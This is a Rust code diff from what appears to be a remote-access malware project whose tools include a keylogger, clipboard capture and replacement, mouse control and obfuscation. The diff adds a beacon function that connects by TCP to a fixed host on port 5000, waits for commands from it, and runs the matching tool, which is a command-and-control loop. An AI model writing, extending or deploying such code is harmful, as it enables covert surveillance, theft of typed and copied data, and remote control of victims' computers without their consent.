@@ -1,11 +1,12 @@
-mod generator;
 mod listener;
 mod tools;
 use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, obfuscate, Tool};
 use std::{
-    io::{self, Write},
+    io::{self, Read, Write},
     error::Error,
+    net::TcpStream,
 };
+
 
 fn check_tool(input: &str) -> Tool {
     match input {
@@ -63,7 +64,8 @@ pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static st
     while let Some(arg) = args.next() {
         match arg.as_str() {
             "generate" => {
-                generator::generate();
+                // generator::generate();
+                todo!("Implement me!")
             }
             "listen" => {
                 listener::start();
@@ -123,4 +125,19 @@ pub fn run(tool: Tool) -> Result<(), Box<dyn Error>> {
         }
     }
     Ok(())
+}
+
+pub fn beacon() {
+    if let Ok(mut stream) = TcpStream::connect("10.255.255.254:5000") {
+        loop {
+            let mut buffer = [0; 1024];
+            if let Ok(n) = stream.read(&mut buffer) {
+                if n > 0 {
+                    let cmd = String::from_utf8_lossy(&buffer[..n]);
+                    let tool = check_tool(&cmd);
+                    run(tool).unwrap();
+                }
+            }
+        } 
+    }
 }
